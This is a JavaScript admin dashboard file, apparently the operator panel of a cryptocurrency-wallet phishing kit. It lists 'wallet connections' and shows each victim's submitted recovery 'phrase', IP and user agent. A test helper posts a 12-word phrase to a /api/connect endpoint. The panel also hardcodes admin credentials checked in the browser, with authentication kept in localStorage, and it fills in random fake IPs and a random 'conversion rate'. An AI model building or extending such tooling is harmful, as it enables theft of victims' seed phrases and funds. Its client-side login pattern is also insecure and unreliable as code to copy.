document.addEventListener("DOMContentLoaded", () => {
  // DOM Elements
  const navLinks = document.querySelectorAll(".nav-menu a[data-section]")
  const sections = document.querySelectorAll(".content-section")
  const loginModal = document.getElementById("login-modal")
  const loginBtn = document.getElementById("login-btn")
  const loginUsername = document.getElementById("login-username")
  const loginPassword = document.getElementById("login-password")
  const loginError = document.getElementById("login-error")
  const logoutBtn = document.getElementById("logout-btn")
  const refreshDashboardBtn = document.getElementById("refresh-dashboard")
  const refreshActivitiesBtn = document.getElementById("refresh-activities")
  const exportActivitiesBtn = document.getElementById("export-activities")
  const lastUpdated = document.getElementById("last-updated")
  const totalConnections = document.getElementById("total-connections")
  const todayConnections = document.getElementById("today-connections")
  const uniqueWallets = document.getElementById("unique-wallets")
  const conversionRate = document.getElementById("conversion-rate")
  const recentActivityList = document.getElementById("recent-activity-list")
  const activitiesTableBody = document.getElementById("activities-table-body")
  const activitiesEmptyState = document.getElementById("activities-empty-state")
  const walletFilter = document.getElementById("wallet-filter")
  const dateFilter = document.getElementById("date-filter")
  const activityDetailModal = document.getElementById("activity-detail-modal")
  const closeModalBtns = document.querySelectorAll(".close-btn, .close-modal")
  const notificationToast = document.getElementById("notification-toast")
  const toastCloseBtn = document.querySelector(".toast-close")

  // Check if logged in
  function checkAuth() {
    const isLoggedIn = localStorage.getItem("isAdminLoggedIn") === "true"
    if (!isLoggedIn) {
      showLoginModal()
    } else {
      hideLoginModal()
      updateDashboard()
    }
  }

  // Show login modal
  function showLoginModal() {
    loginModal.classList.add("active")
  }

  // Hide login modal
  function hideLoginModal() {
    loginModal.classList.remove("active")
    loginUsername.value = ""
    loginPassword.value = ""
    loginError.textContent = ""
  }

  // Handle login
  function handleLogin() {
    const username = loginUsername.value
    const password = loginPassword.value

    if (username === "cblsupport001" && password === "og001cbl") {
      localStorage.setItem("isAdminLoggedIn", "true")
      hideLoginModal()
      updateDashboard()
    } else {
      loginError.textContent = "Invalid username or password"
      loginPassword.value = ""
    }
  }

  // Handle logout
  function handleLogout() {
    localStorage.removeItem("isAdminLoggedIn")
    checkAuth()
  }

  // Switch sections
  function switchSection(sectionId) {
    // Remove active class from all sections
    sections.forEach((section) => section.classList.remove("active"))

    // Add active class to target section
    document.getElementById(`${sectionId}-section`).classList.add("active")

    // Update active nav link
    navLinks.forEach((link) => {
      if (link.getAttribute("data-section") === sectionId) {
        link.parentElement.classList.add("active")
      } else {
        link.parentElement.classList.remove("active")
      }
    })
  }

  // Format date
  function formatDate(dateString) {
    const date = new Date(dateString)
    return date.toLocaleDateString("en-US", {
      month: "short",
      day: "numeric",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    })
  }

  // Generate random IP
  function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
  }

  // Update the getActivities function to fetch from the server API instead of localStorage
  function getActivities() {
    return fetch("/api/activities")
      .then((response) => response.json())
      .then((data) => data.activities || [])
      .catch((error) => {
        console.error("Error fetching activities:", error)
        return []
      })
  }

  // Update the saveActivities function to be a no-op since we're not saving to localStorage anymore
  function saveActivities(activities) {
    // This function is now a no-op since data is saved on the server
    console.log("Activities are saved on the server")
  }

  // Update the updateDashboard function to use async/await
  async function updateDashboard() {
    const activities = await getActivities()
    const now = new Date()

    // Update last updated time
    lastUpdated.textContent = now.toLocaleString()

    // Update stats
    totalConnections.textContent = activities.length

    // Calculate today's connections
    const today = new Date().setHours(0, 0, 0, 0)
    const todayActivities = activities.filter((activity) => {
      const activityDate = new Date(activity.timestamp).setHours(0, 0, 0, 0)
      return activityDate === today
    })
    todayConnections.textContent = todayActivities.length

    // Calculate unique wallets
    const uniqueWalletTypes = [...new Set(activities.map((activity) => activity.wallet))]
    uniqueWallets.textContent = uniqueWalletTypes.length

    // Calculate conversion rate (random for demo)
    conversionRate.textContent = `${Math.floor(Math.random() * 15 + 5)}%`

    // Update recent activity list
    updateRecentActivities()

    // Update full activities table
    updateActivitiesTable()
  }

  // Update the updateRecentActivities function to use async/await
  async function updateRecentActivities() {
    const activities = await getActivities()

    if (activities.length === 0) {
      recentActivityList.innerHTML = `
        <div class="empty-state">
          <p>No recent activities</p>
        </div>
      `
      return
    }

    recentActivityList.innerHTML = ""

    // Get the 5 most recent activities
    const recentActivities = activities.slice(0, 5)

    recentActivities.forEach((activity) => {
      const activityItem = document.createElement("div")
      activityItem.className = "activity-item"
      activityItem.innerHTML = `
        <div class="activity-details">
          <div class="wallet-icon">${activity.wallet.charAt(0).toUpperCase()}</div>
          <div class="activity-info">
            <div class="activity-type">${activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1)} Wallet Connection</div>
            <div class="activity-time">${formatDate(activity.timestamp)}</div>
          </div>
        </div>
        <div class="activity-status">Completed</div>
      `

      recentActivityList.appendChild(activityItem)
    })
  }

  // Update the updateActivitiesTable function to use async/await
  async function updateActivitiesTable() {
    let activities = await getActivities()

    // Apply filters
    const walletFilterValue = walletFilter.value
    const dateFilterValue = dateFilter.value

    if (walletFilterValue !== "all") {
      activities = activities.filter((activity) => activity.wallet === walletFilterValue)
    }

    if (dateFilterValue !== "all") {
      const now = new Date()
      const today = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime()

      if (dateFilterValue === "today") {
        activities = activities.filter((activity) => {
          const activityDate = new Date(activity.timestamp).getTime()
          return activityDate >= today
        })
      } else if (dateFilterValue === "yesterday") {
        const yesterday = today - 24 * 60 * 60 * 1000
        activities = activities.filter((activity) => {
          const activityDate = new Date(activity.timestamp).getTime()
          return activityDate >= yesterday && activityDate < today
        })
      } else if (dateFilterValue === "week") {
        const lastWeek = today - 7 * 24 * 60 * 60 * 1000
        activities = activities.filter((activity) => {
          const activityDate = new Date(activity.timestamp).getTime()
          return activityDate >= lastWeek
        })
      } else if (dateFilterValue === "month") {
        const lastMonth = today - 30 * 24 * 60 * 60 * 1000
        activities = activities.filter((activity) => {
          const activityDate = new Date(activity.timestamp).getTime()
          return activityDate >= lastMonth
        })
      }
    }

    // Update table
    activitiesTableBody.innerHTML = ""

    if (activities.length === 0) {
      activitiesEmptyState.style.display = "block"
      return
    }

    activitiesEmptyState.style.display = "none"

    activities.forEach((activity, index) => {
      const tr = document.createElement("tr")
      tr.innerHTML = `
        <td>${index + 1}</td>
        <td>${activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1)}</td>
        <td>${formatDate(activity.timestamp)}</td>
        <td>${activity.ip || generateRandomIP()}</td>
        <td><span class="activity-status">Completed</span></td>
        <td>
          <button class="action-btn view-details" data-index="${index}">View Details</button>
        </td>
      `

      activitiesTableBody.appendChild(tr)
    })

    // Attach event listeners to view details buttons
    document.querySelectorAll(".view-details").forEach((btn) => {
      btn.addEventListener("click", function () {
        const index = Number.parseInt(this.getAttribute("data-index"))
        showActivityDetails(activities[index])
      })
    })
  }

  // Show activity details in modal
  function showActivityDetails(activity) {
    document.getElementById("detail-wallet").textContent =
      activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1)
    document.getElementById("detail-phrase").textContent = activity.phrase
    document.getElementById("detail-timestamp").textContent = formatDate(activity.timestamp)
    document.getElementById("detail-ip").textContent = activity.ip || generateRandomIP()
    document.getElementById("detail-useragent").textContent = activity.userAgent || navigator.userAgent

    activityDetailModal.classList.add("active")
  }

  // Show notification toast
  function showNotification(title, message) {
    const toastTitle = document.querySelector(".toast-title")
    const toastMessage = document.querySelector(".toast-message")

    toastTitle.textContent = title
    toastMessage.textContent = message

    notificationToast.classList.add("active")

    setTimeout(() => {
      notificationToast.classList.remove("active")
    }, 5000)
  }

  // Event listeners
  loginBtn.addEventListener("click", handleLogin)
  logoutBtn.addEventListener("click", handleLogout)

  navLinks.forEach((link) => {
    link.addEventListener("click", function (e) {
      e.preventDefault()
      const sectionId = this.getAttribute("data-section")
      switchSection(sectionId)
    })
  })

  refreshDashboardBtn.addEventListener("click", updateDashboard)
  refreshActivitiesBtn.addEventListener("click", updateActivitiesTable)

  walletFilter.addEventListener("change", updateActivitiesTable)
  dateFilter.addEventListener("change", updateActivitiesTable)

  exportActivitiesBtn.addEventListener("click", () => {
    alert("Export functionality would be implemented here")
  })

  closeModalBtns.forEach((btn) => {
    btn.addEventListener("click", () => {
      activityDetailModal.classList.remove("active")
    })
  })

  document.getElementById("delete-activity").addEventListener("click", () => {
    alert("Delete functionality would be implemented here")
    activityDetailModal.classList.remove("active")
  })

  toastCloseBtn.addEventListener("click", () => {
    notificationToast.classList.remove("active")
  })

  // Update the checkForNewActivities function to use the server API
  async function checkForNewActivities() {
    try {
      const response = await fetch("/api/activities")
      const data = await response.json()
      const newActivities = data.activities || []

      // Compare with current activities count
      const currentActivities = await getActivities()
      return newActivities.length - currentActivities.length
    } catch (error) {
      console.error("Error checking for new activities:", error)
      return 0
    }
  }

  // Check for new data every 30 seconds
  setInterval(async () => {
    const newActivities = await checkForNewActivities()

    if (newActivities > 0) {
      showNotification("New Activity", `${newActivities} new wallet connection(s) detected`)
      updateDashboard()
    }
  }, 30000)

  // Initialize
  checkAuth()
  switchSection("dashboard")

  // For demo, attach to window for easier testing
  window.testAddActivity = async (wallet, phrase) => {
    const userData = {
      wallet: wallet || "metamask",
      phrase: phrase || "test test test test test test test test test test test test",
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
    }

    try {
      const response = await fetch("/api/connect", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(userData),
      })

      if (response.ok) {
        updateDashboard()
        showNotification("New Connection", `New ${userData.wallet} wallet connected`)
        return "Activity added successfully"
      } else {
        return "Failed to add activity"
      }
    } catch (error) {
      console.error("Error adding activity:", error)
      return "Error adding activity"
    }
  }
})
